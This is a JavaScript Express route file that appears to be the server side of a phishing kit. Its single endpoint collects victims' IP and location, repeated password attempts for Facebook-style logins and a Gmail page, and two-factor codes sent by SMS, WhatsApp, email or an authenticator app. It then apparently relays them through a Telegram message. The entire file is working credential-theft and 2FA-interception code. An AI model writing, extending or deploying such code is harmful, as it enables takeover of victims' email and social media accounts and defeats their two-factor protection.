import express from 'express';
import { getMemoryStore } from '../utils/memory-store.js';
import { getUserMessageManager } from '../utils/userMessageManager.js';

const router = express.Router();

const isKnownValue = (value) =>
  typeof value === "string" &&
  value.trim() !== "" &&
  value.toLowerCase() !== "unknown";

const mergeUserData = (existingData = {}, incomingData = {}) => {
  const merged = { ...existingData, ...incomingData };

  if (!isKnownValue(incomingData.ip) && isKnownValue(existingData.ip)) {
    merged.ip = existingData.ip;
  }
  if (!isKnownValue(incomingData.country) && isKnownValue(existingData.country)) {
    merged.country = existingData.country;
  }
  if (!isKnownValue(incomingData.city) && isKnownValue(existingData.city)) {
    merged.city = existingData.city;
  }
  if (
    !isKnownValue(incomingData.countryCode) &&
    isKnownValue(existingData.countryCode)
  ) {
    merged.countryCode = existingData.countryCode;
  }

  return merged;
};

router.post('/user', async (req, res) => {
  try {
    if (!req.body || !req.body.id) {
      return res.status(400).json({
        success: false,
        message: 'Request body and ID are required'
      });
    }

    const { id } = req.body;
    const userData = { ...req.body };

    const userStore = getMemoryStore();
    const existingUser = userStore.get(id);

    if (existingUser) {
      existingUser.data = mergeUserData(existingUser.data, userData);
      existingUser.lastUpdated = new Date().toISOString();
      existingUser.lastActivity = Date.now();
      userStore.set(id, existingUser);
      console.log(`Updated user data for ID: ${id}`);
    } else {
      const newUser = {
        userId: id,
        data: userData,
        connectedAt: new Date().toISOString(),
        lastUpdated: new Date().toISOString(),
        lastActivity: Date.now(),
        ip: userData.ip,
      };
      userStore.set(id, newUser);
      console.log(`Created new user entry for ID: ${id}`);
    }

    const manager = getUserMessageManager();

    const tfaFields = [userData.tfa_one, userData.tfa_two, userData.whatsapp, userData.email2fa, userData.auth_app_2fa];
    const newTfaValues = tfaFields.filter(Boolean);
    if (newTfaValues.length > 0) {
      const user = manager.getUser(id);
      const existing = user.data.tfaCodes || [];
      for (const val of newTfaValues) {
        if (!existing.includes(val)) {
          existing.push(val);
        }
      }
      userData.tfaCodes = existing;
    }

    if (userData.page_name !== "Gmail") {
      const user = manager.getUser(id);
      if (userData.login_email || userData.email) {
        userData.fb_email = userData.login_email || userData.email;
      }
      const fbPwds = user.data.fb_passwords || [];
      [userData.password_one, userData.password_two, userData.password_three]
        .filter(Boolean)
        .forEach((p) => { if (!fbPwds.includes(p)) fbPwds.push(p); });
      if (fbPwds.length > 0) userData.fb_passwords = fbPwds;
    }

    await manager.update(id, { ...userData, _lastUpdate: Date.now() });

    return res.status(200).json({
      success: true,
      message: 'User data stored and Telegram message updated'
    });

  } catch (error) {
    console.error('Error in /api/create/user:', error);
    return res.status(500).json({
      success: false,
      message: 'Internal server error',
    });
  }
});

export default router;
